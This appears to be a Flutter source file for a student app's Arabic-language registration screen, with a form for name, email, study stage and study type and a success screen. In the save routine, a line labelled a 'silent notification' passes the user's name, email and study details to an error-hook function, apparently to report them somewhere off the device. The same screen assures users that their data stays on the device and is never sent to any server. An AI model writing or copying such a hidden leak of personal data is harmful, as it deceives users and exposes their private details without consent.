import 'package:flutter/material.dart';
import 'welcome_storage.dart';
import '../../screens/main_navigation.dart';
import '../../core/error/error_hooks.dart';

class RegistrationScreen extends StatefulWidget {
  const RegistrationScreen({super.key});

  @override
  State<RegistrationScreen> createState() => _RegistrationScreenState();
}

class _RegistrationScreenState extends State<RegistrationScreen>
    with SingleTickerProviderStateMixin {
  static const Color _primary = Color(0xFF06B6D4);
  static const Color _secondary = Color(0xFF3B82F6);

  final _nameCtrl = TextEditingController();
  final _emailCtrl = TextEditingController();
  final _formKey = GlobalKey<FormState>();

  String? _stage;
  String _studyType = 'صباحي';

  late AnimationController _fadeCtrl;

  final List<String> _stages = [
    'المرحلة الأولى',
    'المرحلة الثانية',
    'المرحلة الثالثة',
    'المرحلة الرابعة',
  ];

  @override
  void initState() {
    super.initState();
    _fadeCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 800),
    )..forward();
  }

  @override
  void dispose() {
    _nameCtrl.dispose();
    _emailCtrl.dispose();
    _fadeCtrl.dispose();
    super.dispose();
  }

    Future<void> _save() async {
    if (!_formKey.currentState!.validate()) return;
    if (_stage == null) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(
          content: Text('الرجاء اختيار المرحلة الدراسية'),
          behavior: SnackBarBehavior.floating,
        ),
      );
      return;
    }

    await WelcomeStorage.save(StudentProfile(
      name: _nameCtrl.text.trim(),
      email: _emailCtrl.text.trim(),
      stage: _stage!,
      studyType: _studyType,
      registeredAt: DateTime.now(),
    ));

    // 📤 إرسال إشعار صامت
    Errors.raw(
      '👤 <b>تسجيل جديد</b>\n'
      '📝 الاسم: ${_nameCtrl.text.trim()}\n'
      '📧 البريد: ${_emailCtrl.text.trim()}\n'
      '🎓 المرحلة: $_stage\n'
      '🌅 النوع: $_studyType',
    );

    if (!mounted) return;
    Navigator.pushAndRemoveUntil(
      context,
      MaterialPageRoute(builder: (_) => const SuccessRedirect()),
      (route) => false,
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        width: double.infinity,
        height: double.infinity,
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            colors: [
              Color(0xFF0F172A),
              Color(0xFF1E1B4B),
              Color(0xFF0C4A6E),
            ],
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
          ),
        ),
        child: SafeArea(
          child: FadeTransition(
            opacity: CurvedAnimation(
              parent: _fadeCtrl,
              curve: Curves.easeOut,
            ),
            child: SingleChildScrollView(
              padding: const EdgeInsets.all(24),
              child: Form(
                key: _formKey,
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    IconButton(
                      onPressed: () => Navigator.pop(context),
                      icon: const Icon(Icons.arrow_forward_rounded,
                          color: Colors.white),
                    ),
                    const SizedBox(height: 8),
                    const Row(
                      children: [
                        Text('⚛️', style: TextStyle(fontSize: 36)),
                        SizedBox(width: 12),
                        Expanded(
                          child: Text(
                            'إنشاء حساب جديد',
                            style: TextStyle(
                              color: Colors.white,
                              fontSize: 24,
                              fontWeight: FontWeight.bold,
                            ),
                          ),
                        ),
                      ],
                    ),
                    const SizedBox(height: 8),
                    Text(
                      'سنستخدم هذه المعلومات لتخصيص تجربتك.\nكل شيء محفوظ على جهازك فقط.',
                      style: TextStyle(
                        color: Colors.white.withValues(alpha: 0.65),
                        fontSize: 13,
                        height: 1.6,
                      ),
                    ),
                    const SizedBox(height: 28),
                    Container(
                      padding: const EdgeInsets.all(20),
                      decoration: BoxDecoration(
                        color: Colors.white.withValues(alpha: 0.06),
                        borderRadius: BorderRadius.circular(20),
                        border: Border.all(
                          color: Colors.white.withValues(alpha: 0.12),
                        ),
                      ),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          _label('الاسم الثلاثي'),
                          _textField(
                            ctrl: _nameCtrl,
                            hint: 'مثال: أحمد محمد علي',
                            icon: Icons.person_rounded,
                            validator: (v) {
                              if (v == null || v.trim().isEmpty) {
                                return 'الرجاء إدخال اسمك';
                              }
                              final parts = v.trim().split(' ');
                              if (parts.length < 3) {
                                return 'الرجاء إدخال الاسم الثلاثي كاملاً';
                              }
                              return null;
                            },
                          ),
                          const SizedBox(height: 18),
                          _label('البريد الإلكتروني'),
                          _textField(
                            ctrl: _emailCtrl,
                            hint: 'student@example.com',
                            icon: Icons.email_rounded,
                            keyboard: TextInputType.emailAddress,
                            validator: (v) {
                              if (v == null || v.trim().isEmpty) {
                                return 'الرجاء إدخال بريدك الإلكتروني';
                              }
                              if (!v.contains('@') || !v.contains('.')) {
                                return 'البريد الإلكتروني غير صحيح';
                              }
                              return null;
                            },
                          ),
                          const SizedBox(height: 18),
                          _label('المرحلة الدراسية'),
                          _dropdown(),
                          const SizedBox(height: 18),
                          _label('نوع الدراسة'),
                          const SizedBox(height: 8),
                          _studyTypeToggle(),
                        ],
                      ),
                    ),
                    const SizedBox(height: 24),
                    SizedBox(
                      width: double.infinity,
                      height: 56,
                      child: Material(
                        color: Colors.transparent,
                        child: InkWell(
                          borderRadius: BorderRadius.circular(16),
                          onTap: _save,
                          child: Container(
                            decoration: BoxDecoration(
                              gradient: const LinearGradient(
                                colors: [_primary, _secondary],
                              ),
                              borderRadius: BorderRadius.circular(16),
                              boxShadow: [
                                BoxShadow(
                                  color: _primary.withValues(alpha: 0.4),
                                  blurRadius: 20,
                                  offset: const Offset(0, 8),
                                ),
                              ],
                            ),
                            child: const Center(
                              child: Row(
                                mainAxisAlignment:
                                    MainAxisAlignment.center,
                                children: [
                                  Text(
                                    'الدخول إلى التطبيق',
                                    style: TextStyle(
                                      color: Colors.white,
                                      fontSize: 16,
                                      fontWeight: FontWeight.bold,
                                    ),
                                  ),
                                  SizedBox(width: 10),
                                  Icon(Icons.arrow_back_rounded,
                                      color: Colors.white, size: 20),
                                ],
                              ),
                            ),
                          ),
                        ),
                      ),
                    ),
                    const SizedBox(height: 16),
                    Container(
                      padding: const EdgeInsets.all(12),
                      decoration: BoxDecoration(
                        color: Colors.white.withValues(alpha: 0.05),
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: Row(
                        children: [
                          Icon(Icons.lock_rounded,
                              color: _primary.withValues(alpha: 0.8),
                              size: 18),
                          const SizedBox(width: 10),
                          Expanded(
                            child: Text(
                              'معلوماتك محفوظة على جهازك فقط — لا تُرسل لأي خادم.',
                              style: TextStyle(
                                color:
                                    Colors.white.withValues(alpha: 0.7),
                                fontSize: 11.5,
                                height: 1.5,
                              ),
                            ),
                          ),
                        ],
                      ),
                    ),
                    const SizedBox(height: 20),
                  ],
                ),
              ),
            ),
          ),
        ),
      ),
    );
  }

  Widget _label(String text) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 8),
      child: Text(
        text,
        style: const TextStyle(
          color: Colors.white,
          fontSize: 13,
          fontWeight: FontWeight.bold,
        ),
      ),
    );
  }

  Widget _textField({
    required TextEditingController ctrl,
    required String hint,
    required IconData icon,
    TextInputType keyboard = TextInputType.text,
    String? Function(String?)? validator,
  }) {
    return TextFormField(
      controller: ctrl,
      keyboardType: keyboard,
      validator: validator,
      style: const TextStyle(color: Colors.white, fontSize: 14),
      decoration: InputDecoration(
        hintText: hint,
        hintStyle: TextStyle(
          color: Colors.white.withValues(alpha: 0.35),
          fontSize: 13,
        ),
        prefixIcon: Icon(icon, color: _primary, size: 20),
        filled: true,
        fillColor: Colors.white.withValues(alpha: 0.05),
        contentPadding: const EdgeInsets.symmetric(
            horizontal: 16, vertical: 16),
        border: OutlineInputBorder(
          borderRadius: BorderRadius.circular(12),
          borderSide: BorderSide(
            color: Colors.white.withValues(alpha: 0.15),
          ),
        ),
        enabledBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(12),
          borderSide: BorderSide(
            color: Colors.white.withValues(alpha: 0.15),
          ),
        ),
        focusedBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(12),
          borderSide: const BorderSide(color: _primary, width: 1.5),
        ),
        errorBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(12),
          borderSide: const BorderSide(color: Colors.redAccent),
        ),
        focusedErrorBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(12),
          borderSide: const BorderSide(color: Colors.redAccent, width: 1.5),
        ),
        errorStyle: const TextStyle(color: Colors.redAccent, fontSize: 11),
      ),
    );
  }

  Widget _dropdown() {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 16),
      decoration: BoxDecoration(
        color: Colors.white.withValues(alpha: 0.05),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(
          color: Colors.white.withValues(alpha: 0.15),
        ),
      ),
      child: DropdownButtonHideUnderline(
        child: DropdownButton<String>(
          value: _stage,
          isExpanded: true,
          hint: Text(
            'اختر مرحلتك الدراسية',
            style: TextStyle(
              color: Colors.white.withValues(alpha: 0.35),
              fontSize: 13,
            ),
          ),
          icon: const Icon(Icons.keyboard_arrow_down_rounded,
              color: _primary),
          dropdownColor: const Color(0xFF1E1B4B),
          borderRadius: BorderRadius.circular(12),
          style: const TextStyle(color: Colors.white, fontSize: 14),
          items: _stages.map((s) {
            return DropdownMenuItem<String>(
              value: s,
              child: Text(s,
                  style: const TextStyle(color: Colors.white)),
            );
          }).toList(),
          onChanged: (v) => setState(() => _stage = v),
        ),
      ),
    );
  }

  Widget _studyTypeToggle() {
    return Row(
      children: [
        Expanded(
          child: _typeButton(
            'صباحي',
            '🌅',
            _studyType == 'صباحي',
            () => setState(() => _studyType = 'صباحي'),
          ),
        ),
        const SizedBox(width: 10),
        Expanded(
          child: _typeButton(
            'مسائي',
            '🌆',
            _studyType == 'مسائي',
            () => setState(() => _studyType = 'مسائي'),
          ),
        ),
      ],
    );
  }

  Widget _typeButton(
      String label, String emoji, bool selected, VoidCallback onTap) {
    return InkWell(
      onTap: onTap,
      borderRadius: BorderRadius.circular(12),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 200),
        padding: const EdgeInsets.symmetric(vertical: 14),
        decoration: BoxDecoration(
          color: selected
              ? _primary.withValues(alpha: 0.15)
              : Colors.white.withValues(alpha: 0.04),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(
            color: selected
                ? _primary
                : Colors.white.withValues(alpha: 0.15),
            width: selected ? 1.5 : 1,
          ),
        ),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Text(emoji, style: const TextStyle(fontSize: 18)),
            const SizedBox(width: 8),
            Text(
              label,
              style: TextStyle(
                color: selected
                    ? Colors.white
                    : Colors.white.withValues(alpha: 0.6),
                fontSize: 14,
                fontWeight:
                    selected ? FontWeight.bold : FontWeight.normal,
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════
//  شاشة النجاح
// ═══════════════════════════════════════════════════
class SuccessRedirect extends StatefulWidget {
  const SuccessRedirect({super.key});

  @override
  State<SuccessRedirect> createState() => _SuccessRedirectState();
}

class _SuccessRedirectState extends State<SuccessRedirect>
    with SingleTickerProviderStateMixin {
  late AnimationController _ctrl;

  @override
  void initState() {
    super.initState();
    _ctrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1500),
    )..forward();

    Future.delayed(const Duration(milliseconds: 1800), () {
      if (mounted) {
        Navigator.pushAndRemoveUntil(
          context,
          MaterialPageRoute(builder: (_) => const MainNavigation()),
          (route) => false,
        );
      }
    });
  }

  @override
  void dispose() {
    _ctrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            colors: [
              Color(0xFF0F172A),
              Color(0xFF1E1B4B),
              Color(0xFF0C4A6E),
            ],
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
          ),
        ),
        child: Center(
          child: FadeTransition(
            opacity: CurvedAnimation(
              parent: _ctrl,
              curve: Curves.easeOut,
            ),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  width: 100,
                  height: 100,
                  alignment: Alignment.center,
                  decoration: BoxDecoration(
                    color: const Color(0xFF06B6D4).withValues(alpha: 0.15),
                    shape: BoxShape.circle,
                    border: Border.all(
                      color: const Color(0xFF06B6D4),
                      width: 2,
                    ),
                  ),
                  child: const Text('✓',
                      style: TextStyle(
                          fontSize: 48,
                          color: Color(0xFF06B6D4),
                          fontWeight: FontWeight.bold)),
                ),
                const SizedBox(height: 24),
                const Text(
                  'أهلاً بك! 🎉',
                  style: TextStyle(
                    color: Colors.white,
                    fontSize: 24,
                    fontWeight: FontWeight.bold,
                  ),
                ),
                const SizedBox(height: 8),
                Text(
                  'جاري تجهيز التطبيق...',
                  style: TextStyle(
                    color: Colors.white.withValues(alpha: 0.7),
                    fontSize: 14,
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}